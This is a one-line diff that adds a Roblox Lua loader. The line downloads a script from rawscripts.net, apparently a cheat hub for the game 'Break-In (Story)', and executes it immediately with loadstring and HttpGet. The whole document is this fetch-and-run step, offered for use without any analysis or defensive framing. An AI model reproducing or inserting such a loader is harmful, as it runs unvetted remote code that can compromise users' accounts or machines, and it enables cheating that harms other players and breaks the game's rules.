@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Break-In-(Story)-PlayerZN-Hub-61160"))()
